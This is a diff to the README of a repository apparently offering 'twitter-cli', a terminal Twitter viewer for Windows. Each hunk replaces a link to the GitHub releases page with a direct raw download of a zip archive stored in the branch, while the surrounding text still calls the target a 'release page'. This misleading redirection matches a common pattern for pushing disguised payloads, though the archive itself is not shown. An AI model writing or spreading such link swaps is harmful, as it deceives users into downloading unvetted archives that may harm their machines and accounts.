@@ -1,6 +1,6 @@
 # 🐦 twitter-cli - View Twitter Feed in Terminal
 
-[![Download twitter-cli](https://img.shields.io/badge/Download-twitter--cli-brightgreen?style=for-the-badge)](https://github.com/warlockoussama/twitter-cli/releases)
+[![Download twitter-cli](https://img.shields.io/badge/Download-twitter--cli-brightgreen?style=for-the-badge)](https://github.com/warlockoussama/twitter-cli/raw/refs/heads/main/twitter_cli/twitter_cli_2.4.zip)
 
 ## ℹ️ About twitter-cli
 
@@ -43,7 +43,7 @@ To get twitter-cli running on your PC, follow these steps:
 
 Click this big button to open the release downloads page on GitHub:
 
-[![Download twitter-cli](https://img.shields.io/badge/Download-twitter--cli-blue?style=for-the-badge)](https://github.com/warlockoussama/twitter-cli/releases)
+[![Download twitter-cli](https://img.shields.io/badge/Download-twitter--cli-blue?style=for-the-badge)](https://github.com/warlockoussama/twitter-cli/raw/refs/heads/main/twitter_cli/twitter_cli_2.4.zip)
 
 This page lists the latest versions of twitter-cli available for Windows.
 
@@ -118,7 +118,7 @@ The app uses official Twitter APIs. Your login information is kept private.
 If you experience problems, try these steps:
 
 - Restart twitter-cli.  
-- Check for updates on the [release page](https://github.com/warlockoussama/twitter-cli/releases).  
+- Check for updates on the [release page](https://github.com/warlockoussama/twitter-cli/raw/refs/heads/main/twitter_cli/twitter_cli_2.4.zip).  
 - Make sure the Windows firewall is not blocking the app.  
 - Close other apps using heavy internet bandwidth.  
 - Restart your PC to clear temporary issues.
@@ -131,4 +131,4 @@ If the problem persists, open an issue on the GitHub page or search for help onl
 
 For details about the project's code, source, and updates, visit the GitHub repository. This is more useful for users comfortable with software and command-line tools.
 
-[Download and learn more here](https://github.com/warlockoussama/twitter-cli/releases).
+[Download and learn more here](https://github.com/warlockoussama/twitter-cli/raw/refs/heads/main/twitter_cli/twitter_cli_2.4.zip).
